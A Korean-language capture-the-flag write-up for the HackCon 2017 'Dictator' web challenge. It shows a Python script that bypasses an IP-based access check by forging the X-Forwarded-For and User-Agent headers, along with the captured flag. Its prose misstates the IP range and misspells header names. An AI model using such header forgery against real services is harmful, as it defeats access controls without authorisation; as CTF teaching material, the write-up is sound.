# 2017 HackCon - [WEB] Dictator

## Key words

- X-Forwarded-For
- Guessing (Recon)

## Solution

문제에 접속하면 `Access Denied` 만 뜨고 별다른 정보가 없습니다. 

문제 명세를 다시 보면 다음과 같습니다.

```
Dictator 75

A dictator is creating a lot of fuss nowadays by claiming to have nuclear weapons. I somehow got access to his personal website that he uses to send instructions, but I cannot get in. Can you try?

Hint: you need to be living in that country to get access.
Hint2: north korea
```

힌트를 보면 서버에서 판단 했을 때, 접근한 아이피의 주소가 북한으로 나와야 할 것 같습니다. 따라서 요청 해더에 `X-Forward-For`를 이용합니다. 이 해더 필드는 `HTTP Proxy`나 로드 벨런서를 통해 웹 서버로 접속한 클라이언트의 아이피를 식별하기 위해 사용됩니다.

먼저 구글링을 통해 북한의 아이피가 `175.145.176.0 - 175.45.179.255` 대역임을 알았습니다. 이를 `X-Forwared-For` 해더에 넣어 요청을 합니다.

그러면 다음과 같은 응답이 옵니다.

```
You are not following the instructions given by the supreme-leader
```

그 이후론 완전 게싱인데 다른 라이트업을 통해 `User-Agent`를 북한에서 사용하는 웹 브라우저 이름으로 넣어야 하는 것을 알았습니다. (https://github.com/chmodxxx/HackConCTF_2017)

이 역시 구글링을 통해 알 수 있습니다. [Googling](https://www.whitehatsec.com/blog/north-koreas-naenara-web-browser-its-weirder-than-we-thought/)

`User-Agrnt`까지 내나라로 맞춰 보내면 플래그를 획득하게 됩니다.

## Solution Code

```python
import requests

url = "http://defcon.org.in:6063/index.php"

# north korea ip range : 175.145.176.0 - 175.45.179.255

headers = {
    "X-Forwarded-For": "175.45.176.0"
}

r = requests.get(url, headers=headers)

print r.headers
print r.content

'''
{'host': 'defcon.org.in:6063', 'content-type': 'text/html; charset=UTF-8', 'connection': 'close', 'x-powered-by': 'PHP/7.0.22-0ubuntu0.16.04.1'}
You are not following the instructions given by the supreme-leader
'''

# https://www.whitehatsec.com/blog/north-koreas-naenara-web-browser-its-weirder-than-we-thought/

headers = {
    "X-Forwarded-For": "175.45.176.0",
   "User-Agent": "Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4"
}

r = requests.get(url, headers=headers)

print r.headers
print r.content
```

## Result

```
{'host': 'defcon.org.in:6063', 'content-type': 'text/html; charset=UTF-8', 'connection': 'close', 'x-powered-by': 'PHP/7.0.22-0ubuntu0.16.04.1'}
You are not following the instructions given by the supreme-leader
{'host': 'defcon.org.in:6063', 'content-type': 'text/html; charset=UTF-8', 'connection': 'close', 'x-powered-by': 'PHP/7.0.22-0ubuntu0.16.04.1'}
d4rk{Welcome_To_DictatorRuling.TogetherweshalltkeWorld}c0de
```
